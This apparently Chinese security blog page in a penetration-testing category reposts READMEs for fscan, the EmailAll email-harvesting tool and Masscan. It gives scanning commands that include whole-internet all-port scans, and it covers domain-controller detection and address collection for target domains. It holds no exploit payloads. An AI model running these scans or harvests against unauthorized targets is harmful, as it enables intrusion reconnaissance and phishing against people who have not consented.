<p><code>fscan.exe -h 192.168.x.x -p80 -proxy http://127.0.0.1:8080 一键支持xray的poc</code> <a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan/blob/main/image/2020-12-12-13-34-44.png"><img src="https://github.com/shadow1ng/fscan/raw/main/image/2020-12-12-13-34-44.png" alt="img"></a></p>
<p><code>fscan.exe -h 192.168.x.x -p 139 (netbios探测、域控识别,下图的[+]DC代表域控)</code> <a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan/blob/main/image/netbios.png"><img src="https://github.com/shadow1ng/fscan/raw/main/image/netbios.png" alt="img"></a></p>
<p><code>go run .\main.go -h 192.168.x.x/24 -m netbios(-m netbios时,才会显示完整的netbios信息)</code> <a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan/blob/main/image/netbios1.png"><img src="https://github.com/shadow1ng/fscan/raw/main/image/netbios1.png" alt="img"></a></p>
<p><code>go run .\main.go -h 192.0.0.0/8 -m icmp(探测每个C段的网关和数个随机IP,并统计top 10 B、C段存活数量)</code> <a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan/blob/main/image/live.png"><img src="https://github.com/shadow1ng/fscan/raw/main/image/live.png" alt="img.png"></a></p>
<h2 id="5-免责声明"><a href="#5-免责声明" class="headerlink" title="5.免责声明"></a>5.免责声明</h2><p>本工具仅面向<strong>合法授权</strong>的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。</p>
<p>为避免被恶意使用，本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。</p>
<p>在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。<strong>请勿对非授权目标进行扫描。</strong></p>
<p>如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。</p>
<p>在安装并使用本工具前，请您<strong>务必审慎阅读、充分理解各条款内容</strong>，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2025/01/18/%E9%82%AE%E7%AE%B1%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/">
                邮箱收集工具
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2025-01-18</span>
            
            
            
                <span class="category">
                    <a href="/categories/渗透/">渗透</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <h1 id="EmailAll"><a href="#EmailAll" class="headerlink" title="EmailAll"></a>EmailAll</h1><h3 id="A-powerful-Email-Collect-tool"><a href="#A-powerful-Email-Collect-tool" class="headerlink" title="A powerful Email Collect tool"></a>A powerful Email Collect tool</h3><h2 id="0x1-介绍"><a href="#0x1-介绍" class="headerlink" title="0x1 介绍"></a>0x1 介绍</h2><p>😲 &#96;EmailAl is a powerful Email Collect tool —— 一款强大的邮箱收集工具</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Taonn/EmailAll/blob/master/img/example1.png"><img src="https://github.com/Taonn/EmailAll/raw/master/img/example1.png" alt="example1"></a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Taonn/EmailAll/blob/master/img/example2.png"><img src="https://github.com/Taonn/EmailAll/raw/master/img/example2.png" alt="example2"></a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Taonn/EmailAll/blob/master/img/PhoneBook&Snov_result.png"><img src="https://github.com/Taonn/EmailAll/raw/master/img/PhoneBook&Snov_result.png" alt="PhoneBook&amp;Snov_result"></a></p>
<h2 id="0x2-安装-使用"><a href="#0x2-安装-使用" class="headerlink" title="0x2 安装&amp;使用"></a>0x2 安装&amp;使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/Taonn/EmailAll.git</span><br><span class="line">$ cd EmailAll</span><br><span class="line">$ pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EmailAll is a powerful Email Collect tool</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">    python3 emailall.py check</span><br><span class="line">    python3 emailall.py --domain example.com run</span><br><span class="line">    python3 emailall.py --domains ./domains.txt run</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> python3 emailall.py --domain example.com run</span><br><span class="line">python3 emailall.py --domains ./domains.txt run</span><br></pre></td></tr></table></figure>

<p>最终结果保存至<code>result</code>目录，分为不同模块json数据文件和汇总<code>&#123;domain&#125;_All.json</code>文件</p>
<h2 id="0x3-配置"><a href="#0x3-配置" class="headerlink" title="0x3 配置"></a>0x3 配置</h2><p>proxy配置在 <a target="_blank" rel="noopener" href="https://github.com/Taonn/EmailAll/blob/master/config/setting.py">setting.py</a>文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxy=&#123;&#x27;http&#x27;: &#x27;127.0.0.1:2333&#x27;, &#x27;https&#x27;: &#x27;127.0.0.1:2333&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>API配置在 <a target="_blank" rel="noopener" href="https://github.com/Taonn/EmailAll/blob/master/config/api.py">api.py</a>文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># http://www.veryvp.com/</span><br><span class="line">veryvp_username = &#x27;&#x27;</span><br><span class="line">veryvp_password = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"># https://www.github.com</span><br><span class="line">github_token = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"># https://app.snov.io/</span><br><span class="line">snov_username = &#x27;&#x27;</span><br><span class="line">snov_password = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"># https://phonebook.cz/</span><br><span class="line">pb_key = &#x27;&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>veryvp</code>和<code>snov</code>去网站免费注册</li>
<li><code>GitHub</code>的token去设置里创建一个即可</li>
<li><code>phonebook</code>的key访问<a target="_blank" rel="noopener" href="https://phonebook.cz/%E7%84%B6%E5%90%8E%E6%9F%A5%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%B0%86%60API_KEY%60%E7%9A%84%E5%80%BC%E5%A1%AB%E5%85%A5%E5%8D%B3%E5%8F%AF">https://phonebook.cz/然后查看源代码，将`API_KEY`的值填入即可</a></li>
</ul>
<h2 id="0x4-模块"><a href="#0x4-模块" class="headerlink" title="0x4 模块"></a>0x4 模块</h2><p>邮箱信息收集主要来源如下：</p>
<ul>
<li>Search<ul>
<li>Ask</li>
<li>Baidu</li>
<li>Bing</li>
<li>Google</li>
<li>QWant</li>
<li>SO</li>
<li>Sougou</li>
<li>GithubApi</li>
</ul>
</li>
<li>DataSets<ul>
<li>Email-Format</li>
<li>Skymem</li>
<li>Veryvp</li>
<li>PhoneBook</li>
<li>Snov</li>
</ul>
</li>
</ul>
<h3 id="2022-2-19"><a href="#2022-2-19" class="headerlink" title="2022.2.19"></a>2022.2.19</h3><p>更新PhoneBook、Snov模块</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Taonn/EmailAll/blob/master/img/PhoneBook&Snov.png"><img src="https://github.com/Taonn/EmailAll/raw/master/img/PhoneBook&Snov.png" alt="PhoneBook&amp;Snov_result"></a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Taonn/EmailAll/blob/master/img/PhoneBook&Snov_result.png"><img src="https://github.com/Taonn/EmailAll/raw/master/img/PhoneBook&Snov_result.png" alt="PhoneBook&amp;Snov_result"></a></p>
<h3 id="2022-2-16"><a href="#2022-2-16" class="headerlink" title="2022.2.16"></a>2022.2.16</h3><p>更新GithubApi模块</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Taonn/EmailAll/blob/master/img/githubapi.png"><img src="https://github.com/Taonn/EmailAll/raw/master/img/githubapi.png" alt="githubapi"></a></p>
<blockquote>
<p>后续还会更新~</p>
</blockquote>
<p>更多信息请关注<a target="_blank" rel="noopener" href="https://github.com/Taonn/EmailAll/blob/master/docs/changes.md">changes.md</a></p>
<h2 id="0x5-参考"><a href="#0x5-参考" class="headerlink" title="0x5 参考"></a>0x5 参考</h2><p>参考了以下优秀的工具，并修改而来:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/m4ll0k/Infoga">https://github.com/m4ll0k/Infoga</a></li>
</ul>
<p>感谢这些师傅们的分享！！！</p>
<h2 id="0x6-感谢"><a href="#0x6-感谢" class="headerlink" title="0x6 感谢"></a>0x6 感谢</h2><p>感谢网上开源的各大项目！！！</p>
<ul>
<li>特别感谢<a target="_blank" rel="noopener" href="https://github.com/r00tSe7en">Se7en</a>师傅对于接口的补充</li>
</ul>
<h2 id="0x7-免责声明"><a href="#0x7-免责声明" class="headerlink" title="0x7 免责声明"></a>0x7 免责声明</h2><p>本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。 如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。 您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2025/01/18/MasScan-%E6%B5%B7%E9%87%8Fip%E6%89%AB%E6%8F%8F%E5%99%A8/">
                MasScan-海量ip扫描器
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2025-01-18</span>
            
            
            
                <span class="category">
                    <a href="/categories/渗透/">渗透</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <h2 id="github连接"><a href="#github连接" class="headerlink" title="github连接:"></a>github连接:</h2><p><a target="_blank" rel="noopener" href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p>
<h1 id="MASSCAN：海量-IP-端口扫描器"><a href="#MASSCAN：海量-IP-端口扫描器" class="headerlink" title="MASSCAN：海量 IP 端口扫描器"></a>MASSCAN：海量 IP 端口扫描器</h1><p>这是一个互联网规模的端口扫描器。它可以在 5 分钟内扫描整个互联网，从一台机器每秒传输 1000 万个数据包。</p>
<p>它的用法（参数、输出）类似于<code>nmap</code>最著名的端口扫描器。如有疑问，请尝试其中一项功能——支持对多台计算机进行广泛扫描的功能，但不支持对单台计算机进行深度扫描。</p>
<p>在内部，它使用异步传输，类似于 <code>scanrand</code>、<code>unicornscan</code>、 和 等端口扫描器<code>ZMap</code>。它更加灵活，允许任意端口和地址范围。</p>
<p>注意：masscan 使用自己的<strong>专用 TCP&#x2F;IP 堆栈</strong>。除了简单的端口扫描之外的任何操作都可能导致与本地 TCP&#x2F;IP 堆栈发生冲突。这意味着您需要使用<code>--src-ip</code>从不同 IP 地址运行的选项，或者用于<code>--src-port</code>配置 Masscan 使用的源端口，然后还配置内部防火墙（如<code>pf</code>或<code>iptables</code>）以将这些端口与操作系统的其余部分隔离。</p>
<p>该工具是免费的，但请考虑为其开发捐款：比特币钱包地址：1MASSCANaHUiyTtR3bJ2sLGuMw5kDBaj4T</p>
<h1 id="建筑"><a href="#建筑" class="headerlink" title="建筑"></a>建筑</h1><p>在 Debian&#x2F;Ubuntu 上，情况如下所示。<code>gcc</code> 除了 C 编译器（例如或）之外，它实际上没有任何依赖项<code>clang</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get --assume-yes install git make gcc</span><br><span class="line">git clone https://github.com/robertdavidgraham/masscan</span><br><span class="line">cd masscan</span><br><span class="line">make</span><br></pre></td></tr></table></figure>



<p>这会将程序放入<code>masscan/bin</code>子目录中。要安装它（在 Linux 上），请运行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure>



<p>源代码由许多小文件组成，因此使用多线程构建可以加快构建速度。这需要 Raspberry Pi 上超过 2gig（并且会损坏），因此您可以使用较小的数量，而<code>-j4</code>不是所有可能的线程。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j</span><br></pre></td></tr></table></figure>



<p>虽然 Linux 是主要目标平台，但代码在许多其他系统（Windows、macOS 等）上运行良好。以下是一些额外的构建信息：</p>
<ul>
<li>Windows w&#x2F; Visual Studio：使用 VS10 项目</li>
<li>Windows w&#x2F; MinGW：只需键入<code>make</code></li>
<li>Windows w&#x2F;cygwin：无法工作</li>
<li>Mac OS X &#x2F;w XCode：使用 XCode4 项目</li>
<li>Mac OS X &#x2F;w cmdline：只需键入<code>make</code></li>
<li>FreeBSD：类型<code>gmake</code><ul>
<li>其他：尝试将所有文件编译在一起，<code>cc src/*.vs -o bin/masscan</code></li>
</ul>
</li>
</ul>
<p>在 macOS 上，x86 二进制文件在 ARM 模拟下的运行速度似乎同样快。</p>
<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>用法类似于<code>nmap</code>. 扫描某个网段的某些端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># masscan -p80,8000-8100 10.0.0.0/8 2603:3001:2d00:da00::/112</span><br></pre></td></tr></table></figure>



<p>这会：</p>
<ul>
<li>扫描<code>10.x.x.x</code>子网和<code>2603:3001:2d00:da00::x</code>子网</li>
<li>扫描两个子网上的端口 80 以及范围 8000 到 8100，即总共 102 个端口</li>
<li>打印输出<code>&lt;stdout&gt;</code>可以重定向到文件</li>
</ul>
<p>要查看完整的选项列表，请使用该<code>--echo</code>功能。这将转储当前配置并退出。该输出可以用作程序的输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># masscan -p80,8000-8100 10.0.0.0/8 2603:3001:2d00:da00::/112 --echo &gt; xxx.conf</span><br><span class="line"># masscan -c xxx.conf --rate 1000</span><br></pre></td></tr></table></figure>



<h2 id="横幅检查"><a href="#横幅检查" class="headerlink" title="横幅检查"></a>横幅检查</h2><p>Masscan 的功能不仅仅是检测端口是否打开。它还可以在该端口完成与应用程序的TCP连接和交互，以获取简单的“横幅”信息。</p>
<p>Masscan 支持以下协议的横幅检查：</p>
<ul>
<li>文件传输协议</li>
<li>HTTP协议</li>
<li>IMAP4</li>
<li>内存缓存</li>
<li>POP3</li>
<li>邮件传输协议</li>
<li>SSH</li>
<li>SSL协议</li>
<li>SMBv1</li>
<li>SMBv2</li>
<li>远程登录</li>
<li>远程开发计划</li>
<li>虚拟网络控制器</li>
</ul>
<p>问题在于，masscan 包含自己的 TCP&#x2F;IP 堆栈，与运行它的系统分开。当本地系统收到来自被探测目标的 SYN-ACK 时，它会使用 RST 数据包进行响应，该数据包会在 Masscan 抓取横幅之前终止连接。</p>
<p>防止这种情况的最简单方法是为 Masscan 分配一个单独的 IP 地址。这看起来像以下示例之一：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># masscan 10.0.0.0/8 -p80 --banners --source-ip 192.168.1.200</span><br><span class="line">  # masscan 2a00:1450:4007:810::/112 -p80 --banners --source-ip 2603:3001:2d00:da00:91d7:b54:b498:859d</span><br></pre></td></tr></table></figure>



<p>您选择的地址必须位于本地子网上，并且不能被其他系统使用。Masscan 会警告你犯了一个错误，但你可能已经弄乱了另一台机器的通信几分钟，所以要小心。</p>
<p>在某些情况下，例如 WiFi，这是不可能的。在这些情况下，您可以对 Masscan 使用的端口进行防火墙。这可以防止本地 TCP&#x2F;IP 堆栈看到该数据包，但 Masscan 仍然可以看到它，因为它绕过了本地堆栈。对于 Linux，这看起来像：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># iptables -A INPUT -p tcp --dport 61000 -j DROP</span><br><span class="line"># masscan 10.0.0.0/8 -p80 --banners --source-port 61000</span><br></pre></td></tr></table></figure>



<p>您可能希望选择与 Linux 可能选择的源端口不冲突的端口。您可以通过查看文件来查看 Linux 使用的范围并重新配置该范围：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/sys/net/ipv4/ip_local_port_range</span><br></pre></td></tr></table></figure>



<p>在最新版本的 Kali Linux（2018 年 8 月）上，该范围是 32768 到 60999，因此您应该选择低于 32768 或 61000 及以上的端口。</p>
<p>设置<code>iptables</code>规则仅持续到下次重新启动为止。您需要根据您的发行版查找如何保存配置，例如使用<code>iptables-save</code> 和&#x2F;或<code>iptables-persistent</code>.</p>
<p>在 Mac OS X 和 BSD 上，也有类似的步骤。要找出要避免的范围，请使用如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sysctl net.inet.ip.portrange.first net.inet.ip.portrange.last</span><br></pre></td></tr></table></figure>



<p>在 FreeBSD 和较旧的 MacOS 上，使用<code>ipfw</code>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># sudo ipfw add 1 deny tcp from any to any 40000 in</span><br><span class="line"># masscan 10.0.0.0/8 -p80 --banners --source-port 40000</span><br></pre></td></tr></table></figure>



<p>在较新的 MacOS 和 OpenBSD 上，使用<code>pf</code>数据包过滤实用程序。编辑该文件<code>/etc/pf.conf</code>以添加如下行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">block in proto tcp from any to any port 40000:40015</span><br></pre></td></tr></table></figure>



<p>然后要启用防火墙，请运行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># pfctl -E    </span><br></pre></td></tr></table></figure>



<p>如果防火墙已在运行，则重新启动或使用以下命令重新加载规则：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># pfctl -f /etc/pf.conf</span><br></pre></td></tr></table></figure>



<p>Windows 不会响应 RST 数据包，因此这些技术都不是必需的。然而，masscan 仍然被设计为使用自己的 IP 地址来最好地工作，因此您应该尽可能以这种方式运行，即使不是绝对必要的。</p>
<p>其他检查也需要同样的东西，例如检查<code>--heartbleed</code>，这只是横幅检查的一种形式。</p>
<h2 id="如何扫描整个互联网"><a href="#如何扫描整个互联网" class="headerlink" title="如何扫描整个互联网"></a>如何扫描整个互联网</h2><p>虽然该程序对于较小的内部网络很有用，但它在设计时确实考虑到了整个互联网。它可能看起来像这样：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># masscan 0.0.0.0/0 -p0-65535</span><br></pre></td></tr></table></figure>



<p>扫描整个互联网是不好的。一方面，互联网的某些部分对扫描的反应很糟糕。另一方面，一些网站会跟踪扫描并将您添加到禁止列表中，这将使您无法访问互联网的有用部分。因此，您想要排除很多范围。要将范围列入黑名单或排除范围，您需要使用以下语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># masscan 0.0.0.0/0 -p0-65535 --excludefile exclude.txt</span><br></pre></td></tr></table></figure>



<p>这只是将结果打印到命令行。您可能希望将它们保存到文件中。因此，你想要这样的东西：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># masscan 0.0.0.0/0 -p0-65535 -oX scan.xml</span><br></pre></td></tr></table></figure>



<p>这会将结果保存在 XML 文件中，使您可以轻松地将结果转储到数据库或其他内容中。</p>
<p>但是，这仅以每秒 100 个数据包的默认速率进行，这将花费很长时间来扫描互联网。您需要像这样加快速度：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># masscan 0.0.0.0/0 -p0-65535 --max-rate 100000</span><br></pre></td></tr></table></figure>



<p>这会将速率提高到每秒 100,000 个数据包，这将在每个端口大约 10 小时内扫描整个互联网（减去排除）（如果扫描所有端口则需要 655,360 小时）。</p>
<p>关于此命令行需要注意的是，这些都是<code>nmap</code> 兼容的选项。此外，<code>nmap</code> 还为您设置了兼容的“隐形”选项：<code>-sS -Pn -n --randomize-hosts --send-eth</code>。同样，XML 文件的格式也受到<code>nmap</code>. 当然，存在很多差异，因为程序的<em>异步性质导致了解决问题的根本不同的方法。</em></p>
<p>上面的命令行有点麻烦。不必将所有内容都放在命令行上，而是可以将其存储在文件中。上面的设置看起来像这样：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># My Scan</span><br><span class="line">rate =  100000.00</span><br><span class="line">output-format = xml</span><br><span class="line">output-status = all</span><br><span class="line">output-filename = scan.xml</span><br><span class="line">ports = 0-65535</span><br><span class="line">range = 0.0.0.0-255.255.255.255</span><br><span class="line">excludefile = exclude.txt</span><br></pre></td></tr></table></figure>



<p>要使用此配置文件，请使用<code>-c</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># masscan -c myscan.conf</span><br></pre></td></tr></table></figure>



<p>当您重复扫描时，这也使事情变得更容易。</p>
<p>默认情况下，masscan 首先加载配置文件 <code>/etc/masscan/masscan.conf</code>。任何后续配置参数都会覆盖此默认配置文件中的内容。这就是我放置“excludefile”参数的地方，这样我就不会忘记它。它只是自动工作。</p>
<h2 id="获取输出"><a href="#获取输出" class="headerlink" title="获取输出"></a>获取输出</h2><p>默认情况下，masscan 会生成相当大的文本文件，但很容易将它们转换为任何其他格式。有五种支持的输出格式：</p>
<ol>
<li><p>xml：只需使用参数<code>-oX &lt;filename&gt;</code>. 或者，使用参数<code>--output-format xml</code>和<code>--output-filename &lt;filename&gt;</code>。</p>
</li>
<li><p>二进制：这是masscan 内置格式。它生成的文件要小得多，因此当我扫描互联网时，我的磁盘不会填满。但它们需要被解析。命令行选项<code>--readscan</code>将读取二进制扫描文件。<code>--readscan</code>与该选项一起使用<code>-oX</code>将生成结果文件的 XML 版本。</p>
</li>
<li><p>grepable：这是 Nmap -oG 输出的实现，可以通过命令行工具轻松解析。只需使用参数即可<code>-oG &lt;filename&gt;</code>。或者，使用参数<code>--output-format grepable</code>和 <code>--output-filename &lt;filename&gt;</code>。</p>
</li>
<li><p>json：这会将结果保存为 JSON 格式。只需使用参数即可<code>-oJ &lt;filename&gt;</code>。或者，使用参数<code>--output-format json</code>和 <code>--output-filename &lt;filename&gt;</code>。</p>
</li>
<li><p>list：这是一个简单的列表，每行有一个主机和端口对。只需使用参数即可<code>-oL &lt;filename&gt;</code>。或者，使用参数 <code>--output-format list</code>和<code>--output-filename &lt;filename&gt;</code>。格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;port state&gt; &lt;protocol&gt; &lt;port number&gt; &lt;IP address&gt; &lt;POSIX timestamp&gt;  </span><br><span class="line">open tcp 80 XXX.XXX.XXX.XXX 1390380064</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="与Nmap的比较"><a href="#与Nmap的比较" class="headerlink" title="与Nmap的比较"></a>与Nmap的比较</h2><p>在合理的情况下，我们已尽一切努力使该程序为<code>nmap</code>用户所熟悉，即使它有本质上的不同。Masscan 适合对大量机器进行大范围扫描，而 nmap 则设计用于对单台机器或小范围进行密集扫描。</p>
<p>两个重要的区别是：</p>
<ul>
<li>没有要扫描的默认端口，您必须指定<code>-p &lt;ports&gt;</code></li>
<li><code>nmap</code>目标主机是 IP 地址或简单范围，而不是 DNS 名称，也不能使用时髦的子网范围（例如<code>10.0.0-255.0-255</code>）。</li>
</ul>
<p>您可以认为<code>masscan</code>永久启用以下设置：</p>
<ul>
<li><code>-sS</code>：这仅进行 SYN 扫描（目前，将来会改变）</li>
<li><code>-Pn</code>：不首先 ping 主机，这是异步操作的基础</li>
<li><code>-n</code>: 没有发生 DNS 解析</li>
<li><code>--randomize-hosts</code>：始终完全随机扫描，您无法更改此设置</li>
<li><code>--send-eth</code>：使用原始发送<code>libpcap</code></li>
</ul>
<p>如果您想要其他兼容设置的列表<code>nmap</code>，请使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># masscan --nmap</span><br></pre></td></tr></table></figure>



<h2 id="传输速率（重要！！）"><a href="#传输速率（重要！！）" class="headerlink" title="传输速率（重要！！）"></a>传输速率（重要！！）</h2><p>这个程序发出数据包的速度非常快。在 Windows 上或虚拟机上，它每秒可以处理 300,000 个数据包。在 Linux（无虚拟化）上，它每秒处理 160 万个数据包。这速度足以融化大多数网络。</p>
<p>请注意，它只会融化您自己的网络。它将目标 IP 地址随机化，这样就不会淹没任何远程网络。</p>
<p>默认情况下，速率设置为 100 个数据包&#x2F;秒。要将速率提高到一百万，请使用类似<code>--rate 1000000</code>.</p>
<p>扫描 IPv4 Internet 时，您将扫描大量子网，因此即使有大量数据包发出，每个目标子网也会收到少量传入数据包。</p>
<p>然而，通过 IPv6 扫描，您往往会关注具有数十亿个地址的单个目标子网。因此，您的默认行为将压垮目标网络。网络经常在 Masscan 产生的负载下崩溃。</p>
<h1 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h1><p>本节描述该程序的主要设计问题。</p>
<h2 id="代码布局"><a href="#代码布局" class="headerlink" title="代码布局"></a>代码布局</h2><p>正如您所期望的，该文件<code>main.c</code>包含该函数。<code>main()</code>它还包含<code>transmit_thread()</code>和<code>receive_thread()</code>函数。这些函数已被故意扁平化并带有大量注释，以便您只需逐行浏览每个函数即可阅读程序的设计。</p>
<h2 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h2><p>这是一个<em>异步</em>设计。换句话说，它的作用相当于网络服务器的<code>nmap</code>作用。它具有独立的发送和接收线程，这些线程在很大程度上彼此独立。这与、、 和中发现的设计类型相同。<code>nginx``Apache``scanrand``unicornscan``ZMap</code></p>
<p>由于它是异步的，因此它的运行速度与底层数据包传输允许的速度一样快。</p>
<h2 id="随机化"><a href="#随机化" class="headerlink" title="随机化"></a>随机化</h2><p>Masscan 与其他扫描仪之间的一个关键区别在于它随机化目标的方式。</p>
<p>基本原则是有一个索引变量，该变量从零开始，每次探测时递增 1。在 C 代码中，这表示为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (i = 0; i &lt; range; i++) &#123;</span><br><span class="line">    scan(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>我们必须将索引转换为 IP 地址。假设您想要扫描所有“私有”IP 地址。那将是范围表，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.0/16</span><br><span class="line">10.0.0.0/8</span><br><span class="line">172.16.0.0/12</span><br></pre></td></tr></table></figure>



<p>在此示例中，前 64k 索引附加到 192.168.xx 以形成目标地址。然后，接下来的 1600 万被附加到 10.xxx 该范围内的剩余索引被应用到 172.16.xx</p>
<p>在此示例中，我们只有三个范围。当扫描整个互联网时，我们实际上有超过 100 个范围。那是因为您必须将许多子范围列入黑名单或排除。这会将所需的范围分成数百个较小的范围。</p>
<p>这导致代码中最慢的部分之一。我们每秒传输 1000 万个数据包，并且必须将每个探测器的索引变量转换为 IP 地址。我们通过在少量内存中进行“二分搜索”来解决这个问题。在此数据包速率下，缓存效率开始超过算法效率。理论上有很多更有效的技术，但它们都需要大量的内存，因此在实践中速度会变慢。</p>
<p>我们将把索引转换为 IP 地址的函数称为函数<code>pick()</code>。在使用中，它看起来像：</p>
